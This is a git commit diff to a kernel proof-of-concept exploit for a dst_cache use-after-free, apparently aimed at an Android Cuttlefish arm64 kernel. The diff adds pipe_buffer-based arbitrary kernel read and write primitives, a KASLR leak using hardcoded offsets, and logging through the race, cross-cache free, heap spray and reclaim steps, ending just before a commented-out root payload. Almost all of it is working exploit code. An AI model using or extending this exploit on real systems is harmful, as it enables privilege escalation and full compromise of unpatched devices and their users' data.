87ee68b1975a8134ac9213362be473280e9e4099
Jack Roscoe <jack.x.roscoe@gmail.com>
2026-04-07 16:18:20 -0400

    updates to dst cache exploit

--- kernel_PoCs/bad_dst_cache/src/exp_cuttlefish.c
+++ kernel_PoCs/bad_dst_cache/src/exp_cuttlefish.c
@@ -269,6 +269,173 @@ void close_fds(int *fd_array, usize len) {
     }
 }
 
+
+/////////////////////////////
+//// Addr / Leak Utils   ////
+/////////////////////////////
+
+#define VMEMMAP_START 0xfffffffeffe00000
+#define LINEAR_BASE 0xffffff8000000000
+#define PHYS_BASE 0x200000
+
+#define PAGE_OFFSET_BASE 0x676900
+#define PIPE_OPS_OFFSET 0x676900
+
+usize vmem_base = 0;
+usize kaslr_base = 0;
+usize phys_base = 0;
+usize linear_base = 0;
+
+usize addr_to_page(usize addr) {
+  return ((addr >> 12) << 6) + vmem_base;
+}
+
+usize is_linear_address(usize addr) {
+  return (addr & 0xffff000000000000) == 0xffff000000000000;
+}
+
+usize is_kernel_address(usize addr) {
+  return (addr & 0xffffffc000000000) == 0xffffffc000000000;
+}
+
+
+/////////////////////////////
+//// Pipe Buffer R/W     ////
+/////////////////////////////
+
+struct pipe_buffer_t {
+  unsigned long page;
+  unsigned int offset, len;
+  unsigned long ops;
+  unsigned long flag;
+  unsigned long private;
+};
+
+typedef struct {
+    Pipe exp_pipe;
+    Pipe exp_page_pipe;
+    usize pipe_page_offset;
+    struct pipe_buffer_t pipe_buffer_leak;
+} RwContext;
+
+RwContext global_rw_context = { 0 };
+
+unsigned long read64(usize addr) {
+    if ((addr & 0xfff) + 8 > 0x1000) {
+        panic("invalid read");
+        return 0;
+    }
+
+    u8 buffer[0x1000] = { 0 };
+    SYSCHK(read(global_rw_context.exp_page_pipe.read_fd, buffer, sizeof(buffer)));
+
+    memset(buffer, 'D', 0x1000);
+    struct pipe_buffer_t *pipe_buffer = (struct pipe_buffer_t *) (&buffer[global_rw_context.pipe_page_offset]);
+
+    memcpy(pipe_buffer, &global_rw_context.pipe_buffer_leak, sizeof(struct pipe_buffer_t));
+
+    pipe_buffer->page = addr_to_page(addr);
+    pipe_buffer->len = 9;
+    pipe_buffer->offset = addr & 0xfff;
+    for (usize i = 1; i < 4; i++) {
+        memcpy(pipe_buffer + i, pipe_buffer, 40);
+    }
+
+    // overwrite pipe_buffer
+    SYSCHK(write(global_rw_context.exp_page_pipe.write_fd, buffer, sizeof(buffer)));
+
+    // now do the read memory
+    usize data;
+    SYSCHK(read(global_rw_context.exp_pipe.read_fd, &data, sizeof(data)));
+    return data;
+}
+
+void write64(usize addr, usize data) {
+    assert((addr & 0xfff) + 8 <= 0x1000);
+
+    u8 buffer[0x1000] = { 0 };
+    SYSCHK(read(global_rw_context.exp_page_pipe.read_fd, buffer, sizeof(buffer)));
+
+    memset(buffer, 'D', 0x1000);
+    struct pipe_buffer_t *pipe_buffer = (struct pipe_buffer_t *) (&buffer[global_rw_context.pipe_page_offset]);
+
+    memcpy(pipe_buffer, &global_rw_context.pipe_buffer_leak, sizeof(struct pipe_buffer_t));
+
+    pipe_buffer->page = addr_to_page(addr);
+    pipe_buffer->len = 0;
+    pipe_buffer->offset = addr & 0xfff;
+    for (usize i = 1; i < 4; i++) {
+        memcpy(pipe_buffer + i, pipe_buffer, 40);
+    }
+
+    // overwrite pipe_buffer
+    SYSCHK(write(global_rw_context.exp_page_pipe.write_fd, buffer, sizeof(buffer)));
+
+    // now do the write of memory
+    SYSCHK(write(global_rw_context.exp_pipe.write_fd, &data, sizeof(data)));
+}
+
+usize read64_kernel(usize addr) {
+    return read64(addr - kaslr_base + phys_base);
+}
+
+void write64_kernel(usize addr, usize data) {
+    write64(addr - kaslr_base + phys_base, data);
+}
+
+usize read64_virtual(usize addr) {
+    // return read64(addr - 0xffff888000000000);
+    return read64(addr - linear_base);
+}
+
+void write64_virtual(usize addr, usize data) {
+    // return write64(addr - 0xffff888000000000, data);
+    return write64(addr - linear_base, data);
+}
+
+usize read64_all(usize addr) {
+    if (is_kernel_address(addr)) {
+        return read64_kernel(addr);
+    } else {
+        return read64_virtual(addr);
+    }
+}
+
+void write64_all(usize addr, usize data) {
+    if (is_kernel_address(addr)) {
+        write64_kernel(addr, data);
+    } else {
+        write64_virtual(addr, data);
+    }
+}
+
+void read_mem(usize addr, usize *data, usize size) {
+    for (int i=0; i<size/8; i++) {
+        data[i] = read64(addr+i*8);
+    }
+}
+
+void write_mem(usize addr, usize *data, usize size) {
+    for (int i=0; i<size/8; i++) {
+        write64(addr+i*8, data[i]);
+    }
+}
+
+void scan_kernel_phys_base() {
+    // scanning did not work for some reason
+    phys_base = PHYS_BASE;
+    // phys_base = 0;
+    // for (;;) {
+    //   usize value = read64(phys_base + 0x38);
+    //   if (!memcmp(&phys_base, "ARMd", 4)) {
+    //     break;
+    //   }
+
+    //   phys_base += 0x1000;
+    // }
+}
+
+
 /////////////////////////////
 //// Trigger Logic       ////
 /////////////////////////////
@@ -378,11 +545,11 @@ void trigger_vuln_loop() {
         if (iteration_count == 5) {
             if (too_long_count == 5) {
                 ctx.timer_offset -= 2000;
-                LOG("Decrease time window to: %ll", ctx.timer_offset);
+                LOG("\nDecrease time window to: %lu\n", ctx.timer_offset);
             } else if (too_long_count == 0) {
                 // being too short is much more expensive
                 ctx.timer_offset += 20000;
-                LOG("Increase time window to: %ll", ctx.timer_offset);
+                LOG("\nIncrease time window to: %lu\n", ctx.timer_offset);
             }
             // if there was a mix of too long and too short, we will eventually hit the race probably
 
@@ -392,7 +559,7 @@ void trigger_vuln_loop() {
 
         // let trigger know it can continue another iteration
         u8 buf = 0;
-        SYSCHK(write(ctx.sync_pipe_to_trigger.read_fd, &buf, sizeof(buf)));
+        SYSCHK(write(ctx.sync_pipe_to_trigger.write_fd, &buf, sizeof(buf)));
 
         // sets up trigger thread to run and trigger exploit
         pin_thread_to_cpu(trigger_pid, 0);
@@ -411,6 +578,7 @@ void trigger_vuln_loop() {
         int mtu = 0;
         socklen_t mtu_len = sizeof(mtu);
         if (getsockopt(ctx.vuln_socket, SOL_IPV6, IPV6_MTU, &mtu, &mtu_len) == -1) {
+            LOG("FAIL: race window too long");
             // race failed: too long
             too_long_count += 1;
 
@@ -420,6 +588,8 @@ void trigger_vuln_loop() {
 
             continue;
         }
+
+        LOG("\nrun exploit...");
 
         // try exploit: race may or may not have succeeded
         // doesn't seem like a cheap way to see if race suceeded other then doing the exploit
@@ -438,6 +608,7 @@ void try_run_main_exploit(TriggerCtx *ctx) {
     Pipe page_pipes[NUM_PAGE_PIPES] = { 0 };
     Pipe vuln_pipes[NUM_VULN_PIPES] = { 0 };
 
+    LOG("setup spray and open pipes...");
     setup_spray();
 
     // setup page pipes to have 1 pipe buffer entry with 1 backing page, but don't prefault
@@ -458,29 +629,35 @@ void try_run_main_exploit(TriggerCtx *ctx) {
         write(vuln_pipes[i].write_fd, &buf, sizeof(buf));
     }
 
+    LOG("rt6_info cross cache free...");
     // close many sockets, hopefully buddy allocator reclaims backing page
     close_fds(ctx->pre_sockets, NUM_PRE_SOCKETS);
     close_fds(ctx->post_sockets, NUM_POST_SOCKETS);
 
     // TODO: setup payload we want to spray
     // after spray, dst_cache hopefully reclaimed
+    LOG("spray kmalloc-256...");
     do_spray();
 
     // now write/send should trigger 'invalid' dst_cache route to be released
+    LOG("trigger kmalloc-256 invalid free...");
     u8 buf = 0;
     SYSCHK(write(ctx->vuln_socket, &buf, sizeof(buf)));
 
     // change vuln pipe buffer to put them in kmalloc-256
     // will hopefully cause pipe to fill freed slot in sprayed object
+    LOG("reclaim with struct pipe_buffer_t...");
     for (usize i = 0; i < NUM_VULN_PIPES; i++) {
         pipe_set_buf_size(&vuln_pipes[i], 4 * 0x1000);
     }
 
     // trigger all sprayed objects to be freed
     // will trigger a page with vuln pipe to be freed
+    LOG("kmalloc-256 cross cache free...");
     reset_spray();
 
     // attempt to reclaim vuln pipe with another pipe backing page
+    LOG("reclaim with pipe buffer backing page...");
     u8 buf2[0x1000] = { 0 };
     memset(buf2, 'A', sizeof(buf2));
     for (usize i = 0; i < NUM_PAGE_PIPES; i++) {
@@ -488,6 +665,7 @@ void try_run_main_exploit(TriggerCtx *ctx) {
     }
 
     // find corrupted pipe
+    LOG("setup arbitrary read/write...");
     int bad_index = -1;
     for (int i = 0; i < NUM_VULN_PIPES; i++) {
         int size = 0;
@@ -516,10 +694,66 @@ void try_run_main_exploit(TriggerCtx *ctx) {
         return;
     }
 
+    RwContext rw_context = { 0 };
+
     // at this point, exploit has succeeded
-    Pipe exp_pipe = vuln_pipes[bad_index];
+    rw_context.exp_pipe = vuln_pipes[bad_index];
 
     LOG("found corrupted pipe FIONREAD");
+
+    // write to observe offset into page
+    SYSCHK(write(rw_context.exp_pipe.write_fd, "PWND", 4));
+
+    bool exp_page_pipe_found = false;
+
+    u8 page_buffer[0x1000] = { 0 };
+    for (usize i = 0; i < NUM_PAGE_PIPES; i++) {
+        SYSCHK(read(page_pipes[i].read_fd, page_buffer, sizeof(page_buffer)));
+
+        usize *words = (usize *) page_buffer;
+        for (usize j = 0; j < sizeof(page_buffer) / sizeof(usize); j++) {
+            if (words[j] != 0x4141414141414141) {
+                rw_context.exp_page_pipe = page_pipes[i];
+                rw_context.pipe_page_offset = (j * sizeof(usize)) - sizeof(struct pipe_buffer_t);
+                memcpy(&rw_context.pipe_buffer_leak, &words[j], sizeof(struct pipe_buffer_t));
+
+                exp_page_pipe_found = true;
+
+                // refill pipe for setup for read64 and write64
+                SYSCHK(write(rw_context.exp_page_pipe.write_fd, page_buffer, sizeof(page_buffer)));
+
+                break;
+            }
+        }
+
+        if (exp_page_pipe_found) {
+            break;
+        }
+    }
+
+    assert(exp_page_pipe_found);
+    global_rw_context = rw_context;
+
+    kaslr_base = rw_context.pipe_buffer_leak.ops - PIPE_OPS_OFFSET;
+    LOG("kaslr base: %lx", kaslr_base);
+
+#ifdef VMEMMAP_START
+    vmem_base = VMEMMAP_START;
+#else
+    vmem_base = rw_context.pipe_buffer_leak.page & 0xfffffffff0000000;
+#endif
+    LOG("vmemmap base: %lx", vmem_base);
+
+    scan_kernel_phys_base();
+    LOG("physical base address: %lx", phys_base);
+
+#ifdef LINEAR_BASE
+    linear_base = LINEAR_BASE;
+#else
+    linear_base = read64_kernel(kaslr_base + PAGE_OFFSET_BASE);
+#endif
+
+    LOG("Arb R/W setup");
 
     // root_payload();
 
